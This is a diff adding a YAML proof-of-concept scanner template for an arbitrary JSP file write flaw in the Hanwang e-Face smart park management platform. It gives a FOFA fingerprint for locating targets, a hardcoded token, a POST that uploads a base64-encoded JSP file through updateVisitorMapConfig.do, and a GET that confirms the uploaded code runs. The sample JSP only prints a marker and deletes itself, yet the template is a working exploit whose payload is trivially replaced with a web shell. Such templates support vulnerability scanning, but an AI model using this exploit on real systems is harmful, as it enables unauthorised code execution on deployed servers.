@@ -1,0 +1,27 @@
+id: poc-yaml-hw-e-face-pass-spmp-updatevisitormapconfig-do-anyfile-write
+info:
+  name: 汉王e脸通智慧园区管理平台 updateVisitorMapConfig.do 任意文件写入漏洞
+  severity: critical
+  tags:
+  - 文件写入
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  t3: base64(concat("<% out.print(\"",t2,"\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"))
+requests:
+- method: POST
+  path: /manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"id\": 1,\n  \"mapName\": \"{{.t1}}\",\n  \"fileType\": \"jsp\",\n\
+    \  \"updatedPhoto\": \"{{.t3}}\"\n}"
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"更新成功")
+    && contains(body,".jsp")
+  output:
+  - regex_match(body,"(?P<file>[0-9a-z]{32}).jsp")
+- method: GET
+  path: /manage/resource/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
